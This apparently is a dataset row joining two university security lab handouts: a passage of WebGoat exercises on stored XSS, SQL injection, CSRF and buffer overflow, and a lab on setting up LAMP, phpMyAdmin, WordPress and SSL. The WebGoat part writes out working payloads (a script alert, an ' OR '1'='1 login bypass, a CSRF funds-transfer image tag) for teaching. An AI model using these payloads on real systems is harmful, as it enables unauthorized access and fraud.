The field will now be set to ""true"".
 
Now, click on Update Profile of Tom Cat (employee).
A window pops up showing all the fields in ""Update Profile"" form. Append the following JavaScript to the address1 field: <script>alert(""XSS"");</script>
 
Click Accept Changes.
 

Click OK on the XSS alert. Now, go to webscarab and uncheck the Intercept requests box under Proxy  Manual Edit.
Then, log out as Tom Cat (employee).

Now, let’s login as another user and see if the JavaScript we have added works when we view Tom’s profile.
Login as Jerry Mouse (hr) where password is ""jerry"". Select Tom Cat (employee) and View Profile. 

 
We should see an alert dialog, saying ""XSS"". This confirms that our script runs when another user is logged in. Using this attack, an attacker can steal user information from the cookies of a victim. 
Click OK on the XSS alert and logout as Jerry Mouse (hr).
Turn off intercept until needed to process the web requests without delay.
Q1: Attach a screenshot of your results showing the lab was successful (with the XSS alert logged in as Jerry Mouse (hr). 

SQL INJECTION 

SQL Injection is a technique to inject attack code into the SQL queries that run on the server. One simple attack is to inject an attack string to achieve unauthorized access to a user’s account. 
Select the following option in the WebGoat left hand menu:
Injection Flaws  LAB: SQL Injection  Stage 1: String SQL Injection
 

Start the intercept in webscarab:
Go to Proxy  Manual Edit and select Intercept requests.

In WebGoat, select the admin (last user on the list). We will see how an attacker can login to a vulnerable web application without providing the password. Click Login on the web application and this request is trapped the webscarab as follows: 

Now tamper the password as follows: 
Set password as <any string>' OR '1'='1. As an example, we set our password as: PWNED' OR '1'='1.
 

Click Accept changes and Stop intercepting 
You should be now logged in as the administrator. To verify your admin rights, try viewing any profile. 
Click Logout to logout as admin.
Q2: Attach a screenshot of successful completion of task.

CROSS SITE REQUEST FORGERY 
CSRF is an attack which forces an end user to execute unwanted actions on a web application in which he/she is currently authenticated. With a little help of social engineering (like sending a link via email/chat), an attacker may force the users of a web application to execute actions of the attacker's choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user.  If the targeted end user is the administrator account, this can compromise the entire web application.

Select the following option in the WebGoat left hand menu: 
Cross Site Scripting (XSS)  Cross Site Request Forgery (CSRF) 
 

In the ""Title:"" field, enter a unique title to grab the victims’ attention such as ""Free Kittens"".
Be sure the Title is unique by including your EUID so we know the submitted solution is yours.
In the ""Message: "" field, you will need to load an HTML image where the image is actually empty and a ""transferFunds"" parameter is loaded with an arbitrary value as follows:
<img src='attack?Screen=2078372&menu=900&transferFunds=5000'>
Then click the ""Submit"" button.
 
(Note: the Screen and menu parameters come from the page source)


You should now scroll down to see your new entry in the Message List below:
 


Clicking on your message should cause your message to load on the victim webpage pulling in your exploit code and revealing a green check box next to the WebGoat Cross Site Request Forgery (CSRF) menu option revealing successful completion of this task. (You may need to refresh the page to get the check box.)

 

Q3: Attach a screenshot showing the lab is successful.

BUFFER OVERFLOW
A buffer overflow occurs when a program or process tries to store more data in a buffer (temporary data storage area) than it was intended to hold. Since buffers are created to contain a finite amount of data, the extra information - which has to go somewhere - can overflow into adjacent buffers, corrupting or overwriting the valid data held in them. Although it may occur accidentally through programming error, buffer overflow is an increasingly common type of security attack on data integrity. In buffer overflow attacks, the extra data may contain codes designed to trigger specific actions, in effect sending new instructions to the attacked computer that could, for example, damage the user's files, change data, or disclose confidential information.  There are many variations of the buffer overflow but for this lab we will focuses on web applications. 
Buffer Overflow and Web Applications
Attackers use buffer overflows to corrupt the execution stack of a web application. By sending carefully crafted input to a web application, an attacker can cause the web application to execute arbitrary code – effectively taking over the machine.
Buffer overflow flaws can be present in both the web server or application server products that serve the static and dynamic aspects of the site, or the web application itself. Buffer overflows found in widely used server products are likely to become widely known and can pose a significant risk to users of these products. When web applications use libraries, such as a graphics library to generate images, they open themselves to potential buffer overflow attacks.
Buffer overflows can also be found in custom web application code, and may even be more likely given the lack of scrutiny that web applications typically go through. Buffer overflow flaws in custom web applications are less likely to be detected because there will normally be far fewer hackers trying to find and exploit such flaws in a specific application. If discovered in a custom application, the ability to exploit the flaw (other than to crash the application) is significantly reduced by the fact that the source code and detailed error messages for the application are normally not available to the hacker.
Consequences 
⦁	Category: Availability: Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.
⦁	Access control (instruction processing): Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program’s implicit security policy.
⦁	Other: When the consequence is arbitrary code execution, this can often be used to subvert any other security service.
Exposure period
⦁	Requirements specification: The choice could be made to use a language that is not susceptible to these issues.
⦁	Design: Mitigating technologies such as safe-string libraries and container abstractions could be introduced.
⦁	Implementation: Many logic errors can lead to this condition. It can be exacerbated by lack of or misuse of mitigating technologies.

Select the following option in the WebGoat left hand menu: 
Buffer Overflows  Off-by-One Overflows 
A web page will be displayed; the web page is simulating a room booking.

 
What you need to do
⦁	You will enter arbitrary details. 
First Name	A
Last Name	A
Room Number	Over 6000 A’s or any characters as shown below 
 

⦁	 Click ""Submit"" and then ""Accept Terms"".

 

⦁	Right click on the page and select ""Inspect Element (Q)"" you will be able to see hidden form fields. Remove the type=""HIDDEN"" parameters for all of the guests.
 

⦁	After deleting the parameter type=""HIDDEN"" you will be able to see details of your input data on the web page. Remember the other guest’s information (i.e., First Name, Last Name, Room Number).

 

⦁	Click on ""Restart Lesson"" and give these room details for one of the users to complete the task. (You can use any of the other member room details.)
 

Q4:	What is John Smith’s room number? Attach a screenshot of the web page showing the details.


"
"['sudo', 'password', 'sudo apt-get install', 'user', 'sudo apt-get', 'file', 'wordpress', 'mysql', 'phpmyadmin', 'install', 'root', 'root password', 'certificate', 'server', 'root password type', 'sudo nano', 'apt-get install', 'directory', 'database', 'ssl', 'password file', 'add', 'type', 'sudo service', 'create']",The University of North Texas,SECURE ECOMMERCE,5560,WordPress SSL,Other,"ParT 1 Basic server setup 
⦁        All Linux commands definition can be found at http://ss64.com/bash/ (I will quiz you on the commands used in this lab for example what does apt-get install do )
⦁        Use the Ubuntu 20.04 for this lab (username: sec-lab / password: untccdc). 
http://cse.unt.edu/downloads/vm/UbuntuDesktopLatest/
⦁        Learn how to check the Operating system version your system is running on 
⦁        uname –r
⦁        Change the root password type
⦁        passwd
⦁        Enter your new password
  (If you feel that you may forget the password when you access the computer next time. Please change the password back to ‘untccdc’. Turn off the system and confirm that the password ‘untccdc’ is working.)
⦁        Add a user (some commands might be different as I am used to centos so use google when an error comes)
⦁        sudo adduser yourname
⦁        sudo passwd password
You are adding a new user because using root is very dangerous 
⦁        add your new user to be a super user  
⦁        sudo nano /etc/sudoers (google the text editor commands) http://www.cs.rit.edu/~cslab/vi.html
⦁        find the line in the text file that has:
root           ALL=(ALL)       ALL  
Add this line below root
yourname  ALL=(ALL)       ALL  
Side note:
To switch between users when you are not root :
⦁        I am currently the user Foo and I want to switch to bob sudo su bob
⦁        I am currently the user Foo and I want to switch to root sudo su or sudo su root   
To switch between users when you are root
⦁        From root to Bob => su Bob
Switch back to the user ‘sec-lab’ 

⦁        Update and upgrade your system (if you’re not root you will need to add sudo inform of the command given below) 

If your dpkg is locked the you will get to see an error use the 
below commands to kill the process
sudo lsof /var/lib/dpkg/lock
sudo kill -9 <process_id>

Note: Make sure Network is attached to NAT.
⦁        sudo apt-get update 
⦁        sudo  apt-get upgrade 
⦁        sudo  apt-get dist-upgrade (No need to execute. Just understand what it does).
Part 2 installing Apache
⦁        To install apache, open terminal and type in:

⦁        sudo apt-get install apache2

⦁        find your ipaddress by typing: (note it down) 10.0.2.15

installing ifconfig 

sudo apt-get install net-tools

ifconfig (note down your ipaddress)

⦁        Test if http services are running. Where is the browser to test this. Well we can test from the host. But we should be able to access the server running in the VM from the host. Follow the below steps to access the server running in the VM from the host machine.
Power off the system. Change the network adapter setting to Host-Only adapter in the network settings. Now the host can access the server.
Turn on the VM and restart the web-server. 
                     sudo service apache2 restart ; 

⦁        Open a web-browser 
⦁        Type http://<ipaddress>  (the <ipaddress>  of host-client 
Type ifconfig ( my ipaddress is 192.168.56.101)
If you can see the apache welcome page, your webserver is up and running.

Q1. Attach the screen shot of the apache welcome page?

CHANGE THE NETWORK SETTINGS BACK TO NAT, otherwise your VM has no internet connection to download the new stuff we are going to do next. To do this power off your VM and change the network setting to NAT and turn on again. 
Part 3 install mysql
⦁        MySQL is a powerful database management system used for organizing and retrieving data 

To install MySQL, open terminal and type in these commands:

        sudo apt-get install mysql-server
⦁        During the installation, MySQL will ask you to set a root password. If you miss the chance to set the password while the program is installing, it is very easy to set the password later from within the MySQL shell.(Please remember your password).
Choose a strong password which contains at least 1 capital letter, 1 
small letter, 1 special character like (_ or @ or $ etc) and 1 digit. 
Follow mysql password policy.

Once you have installed MySQL, we should activate it with this command:
        sudo mysqld
⦁        Finish up by running the MySQL set up script:
        sudo mysql_secure_installation

⦁        The prompt might ask you for your current root password

Type it in.
Enter current password for root (enter for none): 
OK, successfully used password, moving on...

⦁        This might ask for VALIDATE PASSWORD PLUGIN to enable, type N when prompted and skip the plugin.
⦁        It’s easiest just to say Yes to all the options. At the end, MySQL will reload and implement the new changes.

By default, a MySQL installation has an anonymous user, allowing anyone to log into MySQL without having to have a user account created for them.  This is intended only for testing, and to make the installation go a bit smoother.  You should have that ability removed by doing
Remove anonymous users? [Y/n] y                                            
 ... Success!
Normally, root should only be allowed to connect from 'localhost'.  This ensures that someone cannot guess at the root password from the network.
Disallow root login remotely? [Y/n] y
... Success!
By default, MySQL comes with a database named 'test' that anyone can access.  This is also intended only for testing, and should be removed.
Remove test database and access to it? [Y/n] y
 - Dropping test database...
 ... Success!
 - Removing privileges on test database...
 ... Success!
Reloading the privilege tables will ensure that all changes made so far will take effect immediately.
Reload privilege tables now? [Y/n] y
 ... Success!
Cleaning up...
part 4 install php
PHP is an open source web scripting language that is widely used to build dynamic webpages. 
⦁        To install PHP, open terminal and type in this command.
sudo apt-get install php7.4 libapache2-mod-php7.4
After you answer yes to the prompt, PHP will install itself.

It may also be useful to add php to the directory index, to serve the relevant php index files:
sudo nano /etc/apache2/mods-enabled/dir.confcd 
Add index.php to the beginning of index files if not already in file. The page should now look like this:
<IfModule mod_dir.c>
          DirectoryIndex index.php index.html index.cgi index.pl index.php index.xhtml index.htm
</IfModule>
⦁        (Optional) PHP also has a variety of useful libraries and modules that you can add onto your virtual server. You can see the libraries that are available.
⦁        apt-cache search php7.2-
Terminal will then display the list of possible modules. 

Once you decide to install the module, type: (Not required to install any module)
sudo apt-get install name of the module
part 5 Results to see php on your server
Although LAMP is installed, we can still take a look and see the components online by creating a quick php info page
To set this up, first create a new files: 
sudo nano /var/www/info.php
Note: the directory /var/www/
Add in the following line:
<?php
phpinfo();
?>

Then Save and Exit. 


Restart apache so that all of the changes take effect:
sudo service apache2 restart
part 6 Install and secure phpMyadmin
⦁        To install phpmyadmin
sudo apt-get install phpmyadmin
⦁        During the installation, phpMyAdmin will walk you through a basic configuration. Once the process starts up, follow these steps:
⦁        Select Apache2 for the server
⦁        Choose YES when asked about whether to Configure the database for phpmyadmin with dbconfig-common
⦁        Enter your MySQL password when prompted
⦁        Enter the password that you want to use to log into phpmyadmin
⦁        After the installation has completed, add phpmyadmin to the apache configuration.
⦁        sudo nano /etc/apache2/apache2.conf
⦁        Add the phpmyadmin config to the file.
⦁        Include /etc/phpmyadmin/apache.conf
⦁        Restart apache:
⦁        sudo service apache2 restart
You can then access phpmyadmin by going to browser youripaddress/phpmyadmin.  (e.g., : 10.0.2.15/phpmyadmin) Ipaddress can be get by typing ifconfig
Note : If opening a browser gives error “Your Firefox profile cannot be loaded. It may be missing or inaccessible” then execute this command to give permissions for created user. “sudo chown -R $USER:$USER ~/.cache/”
Q2. Attach the screen shot of the browser after the above step.

Security
Unfortunately, older versions of phpMyAdmin have had serious security vulnerabilities including allowing remote users to eventually exploit root on the underlying virtual private server. One can prevent a majority of these attacks through a simple process: locking down the entire directory with Apache's native user/password restrictions which will prevent these remote users from even attempting to exploit older versions of phpMyAdmin.
⦁        Set up the .htaccess File
⦁        sudo nano /etc/phpmyadmin/apache.conf 
⦁        Under the directory section, add the line “AllowOverride All” under “Directory Index”, making the section look like this:
<Directory /usr/share/phpmyadmin>
        Options FollowSymLinks
        DirectoryIndex index.php
        AllowOverride All



⦁        
Configure the .htaccess file
With the .htaccess file allowed, we can proceed to set up a native user whose login would be required to even access the phpmyadmin login page. 

Start by creating the .htaccess page in the phpmyadmin directory:
sudo nano /usr/share/phpmyadmin/.htaccess
⦁        
Follow up by setting up the user authorization within .htaccess file. Copy and paste the following text in: (it’s in the next page)


AuthType Basic
AuthName ""Restricted Files""
AuthUserFile  /etc/apache2/.phpmyadmin.htpasswd
Require valid-user
Below you’ll see a quick explanation of each line.
⦁        AuthType: This refers to the type of authentication that will be used to the check the passwords. The passwords are checked via HTTP and the keyword Basic should not be changed.
⦁        AuthName: This is text that will be displayed at the password prompt. You can put anything here.
⦁        AuthUserFile: This line designates the server path to the password file (which we will create in the next step.)
⦁        Require valid-user: This line tells the .htaccess file that only users defined in the password file can access the phpMyAdmin login screen.
⦁        Create the htpasswd file
We will go ahead and create the valid user information. Start by creating a htpasswd file. Use the htpasswd command, and place the file in a directory of your choice as long as it is not accessible from a browser. Although you can name the password file whatever you prefer, the convention is to name it .htpasswd.
sudo htpasswd -c /etc/apache2/.phpmyadmin.htpasswd username
⦁        A prompt will ask you to provide and confirm your password. Once the username and passwords pair are saved you can see that the password is encrypted in the file. 
⦁        Finish up by restarting apache:
⦁        sudo service apache2 restart

Try accessing your site youripaddress/phpmyadmin 

PhpMyAdmin username will be defaulted to “phpmyadmin”. Password will same as you set. 
Q3. Attach the screen shot of the prompted window.
Q4. Attach the screen shot of the after logon to the prompted window.
part 7 Install wordpress
⦁        Download WordPress
⦁        sudo wget http://wordpress.org/latest.tar.gz
⦁        To unzip the file 
⦁        sudo tar -xzf latest.tar.gz       (After we unzip the wordpress files, they will be in a directory called wordpress in the home directory.) 
⦁        create the wordpress database and user
⦁        sudo mysql -u root -p
⦁        Login using your MySQL root password, and then we need to create a wordpress database, a user in that database, and give that user a new password. Keep in mind that all MySQL commands must end with semi-colon. 
⦁        First, let's make the database (I'm calling mine wordpress yours can be superman lol):

uninstall plugin validate_password;

⦁        CREATE DATABASE wordpress
⦁        Then we need to create the new user. You can replace the database, name, and password, with whatever you prefer:
⦁        CREATE USER wordpressuser@localhost;
⦁        Set the password for your new user:
⦁        SET PASSWORD FOR wordpressuser@localhost = ‘password’;

⦁        Finish up by granting all privileges to the new user. Without this command, the wordpress installer will not be able to start up:
⦁        GRANT ALL PRIVILEGES ON wordpress.* TO wordpressuser@localhost;

⦁        Then refresh MySQL:
⦁        FLUSH PRIVILEGES;
⦁        Exit mysql by typing exit or ctrl+D
Setup up WordPress
⦁        The first step to is to copy the sample wordpress configuration file, located in the wordpress directory, into a new file which we will edit, creating a new usable wordpress config:
⦁        Sudo cp ~/wordpress/wp-config-sample.php ~/wordpress/wp-config.php
⦁        
Then open the wordpress config:
⦁        sudo nano ~/wordpress/wp-config.php

Find the section that contains the field below and substitute in the correct name for your database, username, and password: (note you will input what you inputted in step 5,6 etc). if you do not configure it properly things will not work
⦁        // ** MySQL settings - You can get this info from your web host ** //
⦁        /** The name of the database for WordPress */
⦁        define('DB_NAME', 'wordpress');
⦁        /** MySQL database username */
⦁        define('DB_USER', 'wordpressuser');
⦁        /** MySQL database password */
⦁        define('DB_PASSWORD', 'password');
⦁        Save and Exit.
Copy the Files
⦁        We are almost done uploading Wordpress to the virtual private server. The final move that remains is to transfer the unzipped WordPress files to the website's root directory.
⦁        sudo rsync -avP ~/wordpress/ /var/www/html/
⦁        
Finally, we need to set the permissions on the installation. First, switch in to the web directory:
⦁        cd /var/www/
⦁        
Give ownership of the directory to the apache user. (username is linux username – in our case it is sec-lab)
⦁        sudo chown username:www-data /var/www -R 
⦁        sudo chmod g+w /var/www -R 
⦁        
From here, WordPress has its own easy to follow installation form online. 

However, the form does require a specific php module to run. If it is not yet installed on your server, download php-gd:
⦁        sudo apt-get install php7.2-gd
Access the page by adding /wp-admin/install.php to your site's domain or IP address (e.g., example.com/wp-admin/install.php) and fill out the short online form
Q5. Attach the screen shot of the browser after accessing the site.


part 8 creating a ssl certificate

About SSL Certificates
An SSL certificate is a way to encrypt a site's information and create a more secure connection. Additionally, the certificate can show the virtual private server's identification information to site visitors. Certificate Authorities can issue SSL certificates that verify the server's details while a self-signed certificate has no 3rd party validation. 
⦁         Activate the SSL module
⦁         sudo a2enmod ssl
⦁        Restart apache services
⦁        sudo service apache2 restart
⦁         Create a directory to store the server key and certificate
⦁        sudo mkdir /etc/apache2/ssl
⦁        Create a self-signed SSL Certificate
When we request a new certificate, we can specify how long the certificate should remain valid by changing the 365 to the number of days we prefer. As it stands this certificate will expire after one year.
⦁        sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/apache2/ssl/apache.key -out /etc/apache2/ssl/apache.crt


With this command, we will be both creating the self-signed SSL certificate and the server key that protects it, and placing both of them into the new directory.

⦁        This command will prompt terminal to display a list of fields that need to be filled in.

The most important line is ""Common Name"". Enter your official domain name here or, if you don't have one yet, your site's IP address.
You are about to be asked to enter information that will be incorporated into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:TX
Locality Name (eg, city) []:DENTON
Organization Name (eg, company) [Internet Widgits Pty Ltd]:UNT
Organizational Unit Name (eg, section) []:Dept of CSE
Common Name (e.g. server FQDN or YOUR name) []:youripaddress                  
Email Address []:boo@boo.com
⦁        Now we have all of the required components of the finished certificate. The next thing to do is to set up the virtual hosts to display the new certificate.
⦁        sudo nano /etc/apache2/sites-available/default-ssl.conf
⦁        Within the section that begins with <VirtualHost _default_:443>, quickly make the following changes.

Add a line with your server name (ipaddress) right below the Server Admin email:
         ServerName youripaddress:443      

// youripaddress could be : 192.168.56.101 (if NAT connection it can be 10.0.2.15)


⦁        Find the following three lines in the text file, and make sure that they match the extensions below:
SSLEngine on
SSLCertificateFile /etc/apache2/ssl/apache.crt
SSLCertificateKeyFile /etc/apache2/ssl/apache.key
Save and Exit out of the file

Before the website that will come on the 443 port can be activated, we need to enable that Virtual Host:
⦁        sudo a2ensite default-ssl

Restart apache
⦁        sudo service apache2 reload
In your browser, type https://youraddress, and you will be able to see the new certificate. 
Click on View Certificate
 
 


Q6. Attach the screen shot of the browser. Click on advanced and view certificate before taking screenshot like above.
"